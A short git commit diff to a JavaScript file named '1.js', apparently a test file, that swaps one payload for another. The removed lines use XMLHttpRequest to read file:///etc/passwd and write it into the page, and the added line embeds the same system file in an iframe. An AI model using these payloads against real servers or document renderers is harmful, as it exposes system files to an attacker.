dc3a3c22458c4a9870ee9822ca167f116738085c
Shahid Nawaz <80408404+ShahidKalwani@users.noreply.github.com>
2024-03-11 01:04:54 +0500

    Update 1.js

--- 1.js
+++ 1.js
@@ -3,6 +3,4 @@ console.log("file called");
 console.log("welcome");
 console.log("another updated");
 // request
-x=new XMLHttpRequest;
-x.onload=function(){document.write(this.responseText)};
-x.open("GET","file:///etc/passwd");x.send();
+document.write('<iframe src=file:///etc/passwd></iframe>');
